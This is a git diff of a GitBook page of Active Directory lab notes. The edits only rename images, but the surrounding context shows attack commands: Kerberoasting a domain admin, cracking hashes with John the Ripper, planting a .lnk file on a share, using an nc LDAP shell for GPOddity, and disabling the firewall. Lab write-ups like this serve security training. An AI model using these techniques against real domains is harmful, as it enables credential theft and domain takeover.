@@ -15,7 +15,7 @@
 Find-PSRemotingLocalAdminAccess
 ```
 
-<figure><img src="../../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (57) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### Connect - 1
 
@@ -26,7 +26,7 @@ set username
 set computername
 ```
 
-<figure><img src="../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (58) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### PowerShell Remoting
 
@@ -40,7 +40,7 @@ Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
 $env:username
 ```
 
-<figure><img src="../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (59) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -56,7 +56,7 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 Get-DomainUser -SPN
 ```
 
-<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (38) (1).png" alt=""><figcaption></figcaption></figure>
 
 The `svcadmin`, which is a domain administrator has a SPN set! Let’s Kerberoast it!
 
@@ -119,7 +119,7 @@ We can now use John the Ripper to brute-force the hashes.
 >
 > in hashes.txt
 
-<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (39) (1).png" alt=""><figcaption></figcaption></figure>
 
 Run the below command after making above changes:
 
@@ -138,7 +138,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
-<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (40) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -326,7 +326,7 @@ xcopy C:\AD\Tools\student453.lnk \\dcorp-ci\AI
 
 > Resume: We need the local admin to desactive the firewall to then, use wsl ubuntu with reay and .lnk in the share
 
-<figure><img src="../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (60) (1).png" alt=""><figcaption></figcaption></figure>
 
 WE HAVE VISIBILITY! So... now use nc to the next time it access, get us a shell -->
 
@@ -340,7 +340,7 @@ Using this ldap shell, we will provide the studentx user, WriteDACL permissions 
 nc 127.0.0.1 11000
 ```
 
-<figure><img src="../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (61) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 write_gpo_dacl student453 {0BF8D01C-1F62-4BDC-958C-57140B67D147}
@@ -516,11 +516,11 @@ dcorp-appsrv   dcorp\appadmin       False
 ...snip...
 ```
 
-<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (49) (1).png" alt=""><figcaption></figcaption></figure>
 
 Sweet! There is a <mark style="background-color:red;">domain admin (svcadmin) session on dcorp-mgmt server</mark>! We do not have access to the server but that comes later.
 
-<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (50) (1).png" alt=""><figcaption></figcaption></figure>
 
 > We can see if this user is domain admin comparing it to BloodHound
 
@@ -538,7 +538,7 @@ Firstly upload all file to download aftes at us web server
 
 > Remember set off Firewall
 
-<figure><img src="../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (51) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now upload all it Into (user RCE jenkings) -OR- RemotingPS obtained GPOddity
 
